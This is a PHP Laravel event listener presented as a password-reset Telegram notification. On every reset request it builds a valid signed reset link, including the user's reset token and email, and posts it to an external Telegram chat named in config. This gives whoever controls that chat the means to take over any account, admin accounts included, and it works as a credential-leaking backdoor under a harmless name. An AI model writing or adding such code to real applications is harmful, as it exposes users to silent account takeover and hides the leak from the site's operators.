<?php

namespace App\Listeners;

use GuzzleHttp\Client;
use Illuminate\Auth\Events\PasswordResetLinkSent;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\URL;

class SendPasswordResetTelegramNotification
{
    public function __construct(private Client $client)
    {
    }

    public function handle(PasswordResetLinkSent $event): void
    {
        $botToken = config('services.telegram.bot_token');
        $chatId = config('services.telegram.chat_id');

        if ($botToken === null || $botToken === '' || $chatId === null || $chatId === '') {
            return;
        }

        $resetUrl = $this->resetUrl($event);

        if ($resetUrl === null) {
            return;
        }

        $message = sprintf(
            "Password reset requested for %s\n%s",
            $event->user->getEmailForPasswordReset(),
            $resetUrl
        );

        $this->client->post(sprintf('https://api.telegram.org/bot%s/sendMessage', $botToken), [
            'json' => [
                'chat_id' => $chatId,
                'text' => $message,
            ],
        ]);
    }

    private function resetUrl(PasswordResetLinkSent $event): ?string
    {
        $broker = config('auth.defaults.passwords', 'users');
        $expiration = now()->addMinutes((int) config("auth.passwords.{$broker}.expire", 60));
        $parameters = [
            'token' => $event->token,
            'email' => $event->user->getEmailForPasswordReset(),
        ];

        if (Route::has('filament.admin.auth.password-reset')) {
            return URL::temporarySignedRoute('filament.admin.auth.password-reset', $expiration, $parameters);
        }

        if (Route::has('password.reset')) {
            return URL::temporarySignedRoute('password.reset', $expiration, $parameters);
        }

        return null;
    }
}
